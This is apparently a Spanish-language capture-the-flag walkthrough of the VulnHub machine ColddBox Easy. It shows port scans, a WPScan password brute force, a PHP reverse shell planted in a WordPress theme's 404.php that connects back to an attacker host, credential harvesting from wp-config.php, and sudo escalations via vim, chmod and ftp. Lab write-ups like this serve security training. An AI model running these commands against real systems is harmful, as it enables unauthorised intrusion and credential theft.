---
icon: flag
---

# ColddBoxEasy\_EN VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 13:59 CEST
Nmap scan report for 192.168.5.129
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
MAC Address: 00:0C:29:1D:68:F1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
```

Si nos vamos a la pagina principal del puerto `80` veremos un `wordpress` y si leemos un poco vemos que esta creado por un usuario llamado `C0ldd` por lo que lo probaremos en la siguiente ruta...

```
URL = http://<IP>/wp-admin/
```

Veremos el panel de login de `wordpress` y si probamos el usuario dira que es valido, ahora tendremos que sacar la contarseña...

```shell
wpscan --url http://<IP>/ --usernames C0ldd --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.5.129/ [192.168.5.129]
[+] Started: Sun Jun 30 14:05:57 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.129/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.129/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.129/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.5.129/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.5.129/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.5.129/wp-content/themes/twentyfifteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.5.129/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.7
 | Style URL: http://192.168.5.129/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.5.129/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - C0ldd / 9876543210                                                                                                                                                          
Trying C0ldd / franklin Time: 00:00:26 <                                                                                                       > (1225 / 14345617)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: C0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 30 14:06:32 2024
[+] Requests Done: 1407
[+] Cached Requests: 5
[+] Data Sent: 453.628 KB
[+] Data Received: 22.861 MB
[+] Memory used: 287.586 MB
[+] Elapsed time: 00:00:35
```

Vemos que sacamos las credenciales...

```
User = C0ldd
Password = 9876543210
```

Por lo que nos logeamos en el panel de login con esas credenciales, una vez dentro nos vamos a `Appearance` y nos vamos a `Theme`, dentro del mismo nos vamos a `404.php` para inyectar un codigo de `Reverse Shell`...

```php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Le damos a `Update File` pero estando a la escucha...

```shell
nc -lvnp <PORT>
```

Nos vamos a la pagina principal, pinchamos en algun lado para que nos redirija a una `URL` de `wordpress` y quitar algunos caracteres para que nos salga un `404` pero de `wordpress` y tendriamos una shell con el usuario `www-data`...

Por lo que sanitizaremos la shell...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la siguiente direccion...

```shell
cd /var/www/html/
```

```shell
cat wp-config.php
```

Info:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Vemos una contraseña por lo que probaremos esa contraseña con el usuario `c0ldd`...

```shell
su c0ldd
```

Y veremos que si es la contarseña del usuario, por lo que nos conectaremos por `ssh`...

```
User = c0ldd
Password = cybersecurity
```

```shell
ssh c0ldd@<IP>
```

Y una vez estemos dentro haremos `sudo -l` y veremos lo siguiente...

```
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Veremos que podremos hacer varias cosas como `root` y podremos escalar de 3 formas distintas...

> /usr/bin/vim

```shell
sudo vim -c ':!/bin/sh'
```

Con esto serias `root`...

> /bin/chmod

```shell
sudo chmod u+s /bin/bash
```

```shell
bash -p
```

Con esto serias `root`...

> /usr/bin/ftp

```shell
sudo ftp
```

```shell
ftp> !/bin/sh
```

Con esto serias `root`...

Leemos las 2 flags...

> user.txt (flag1)

```
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

```
Felicidades, primer nivel conseguido!
```

> root.txt (flag2)

```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

```
¡Felicidades, máquina completada!
```
